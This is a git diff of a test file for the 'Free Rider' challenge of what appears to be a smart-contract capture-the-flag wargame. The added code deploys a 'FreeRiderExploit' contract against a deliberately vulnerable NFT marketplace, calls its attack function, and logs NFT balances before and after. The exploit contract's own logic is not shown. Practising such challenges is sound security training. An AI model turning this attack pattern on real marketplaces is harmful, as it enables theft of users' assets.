@@ -149,22 +149,40 @@ describe("[Challenge] Free Rider", function () {
 
   it("Exploit", async function () {
     /** CODE YOUR EXPLOIT HERE */
-    const deployerNFTbalance = await this.nft.balanceOf(deployer.address);
-    console.log("deployerNFTbalance", deployerNFTbalance.toString());
-    // => deployer NFT amount = 6
 
-    const halfETHconvertDVT = await this.uniswapRouter.getAmountsOut(
-      ethers.utils.parseEther("0.5"),
-      [this.weth.address, this.token.address]
+    console.log("1111");
+    const FreeRiderExploit = await ethers.getContractFactory(
+      "FreeRiderExploit"
     );
-    console.log("halfETHconvertDVT", halfETHconvertDVT[0].toString());
-    //0.500000000000000000
-    console.log("halfETHconvertDVT", halfETHconvertDVT[1].toString());
-    //8.30787316946944660
+    this.freeRiderExploit = await FreeRiderExploit.deploy(
+      this.token.address,
+      this.buyerContract.address,
+      this.marketplace.address
+    );
 
-    await this.marketplace.connect(attacker).buyMany([0, 1, 2, 3, 4, 5], {
-      value: NFT_PRICE,
-    });
+    const buyerAddr = this.buyerContract.address;
+    const marketAddr = this.marketplace.address;
+    const ExploitAddr = this.freeRiderExploit.address;
+
+    console.log((await this.nft.balanceOf(buyerAddr)).toString());
+    console.log((await this.nft.balanceOf(marketAddr)).toString());
+    console.log((await this.nft.balanceOf(ExploitAddr)).toString());
+
+    console.log((await this.nft.balanceOf(attacker.address)).toString());
+    console.log((await this.nft.balanceOf(deployer.address)).toString()); // deployer
+    console.log((await this.nft.balanceOf(buyer.address)).toString());
+    // ====
+    // ====
+    await this.freeRiderExploit.connect(buyer).attack();
+    // ====
+    // ====
+    console.log((await this.nft.balanceOf(buyerAddr)).toString());
+    console.log((await this.nft.balanceOf(marketAddr)).toString());
+    console.log((await this.nft.balanceOf(ExploitAddr)).toString());
+
+    console.log((await this.nft.balanceOf(attacker.address)).toString());
+    console.log((await this.nft.balanceOf(deployer.address)).toString()); // deployer
+    console.log((await this.nft.balanceOf(buyer.address)).toString());
   });
 
   after(async function () {
